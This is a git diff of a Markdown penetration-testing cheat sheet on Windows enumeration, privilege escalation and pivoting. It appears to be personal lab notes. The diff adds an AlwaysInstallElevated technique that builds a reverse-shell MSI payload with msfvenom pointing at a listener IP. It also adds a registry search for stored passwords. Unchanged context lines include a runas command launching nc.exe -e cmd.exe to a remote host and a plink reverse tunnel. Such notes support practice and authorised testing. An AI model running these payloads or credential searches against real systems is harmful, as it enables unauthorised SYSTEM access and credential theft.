@@ -1,6 +1,7 @@
 # Windows
 
 ### Important Files
+
 ```
 c:\windows\system32\drivers\etc\hosts
 c:\windows\win.ini
@@ -11,7 +12,7 @@ C:\Windows\System32\DRIVERS
 
 ### Enumeration & Commands
 
-```
+```powershell
 windows-privesc-check2.exe --dump -a		# https://github.com/pentestmonkey/windows-privesc-check 
 systeminfo
 schtasks /query /fo LIST /v		# scheduled task
@@ -19,8 +20,18 @@ Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object
 wmic service get name,displayname,pathname,startmode    # list all the running services
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
 netstat -ano    # find out what ports are open
+---------------------Always Elevated-----------------------
+# if value = 1 for the following reg entry
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Create msi payload: 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.131 LPORT=21 -f msi > esc.msi
+# open nc on kali and run msi on victim to get SYSTEM shell
+# https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/windows/shenzi
+-----------------------------------------------------------
 net users
 net user /domain [username]   # check domain group of the user
+reg query HKLM /f pass /t REG_SZ /s
 -------------------------Run As----------------------------
 runas /netonly /user:[username] cmd	# run cmd as another user (even if they dont exists)
 runas /env /profile /user:DVR4\Administrator "C:\users\viewer\nc.exe -e cmd.exe 192.168.49.169 443 # useful when ssh not working
@@ -84,6 +95,7 @@ Format of Hashes:
 Ref: https://techgenix.com/how-cracked-windows-password-part2/
 
 ### Pivoting
+
 ```
 ----------PLINK.EXE----------
 cmd.exe /c echo y | plink.exe -ssh -l [KALI_USERNAME] -pw [KALI_PASSWORD] -R [KALI_IP]:[KALI_PORT]:127.0.0.1:3306 [KALI_IP]
@@ -250,6 +262,7 @@ Foreach($obj in $Result)
 	Write-Host "------------------------"
 }
 ```
+
 1. Find interesting SPN (Service Principal Name)
 2. Get its SAMaccountname
 
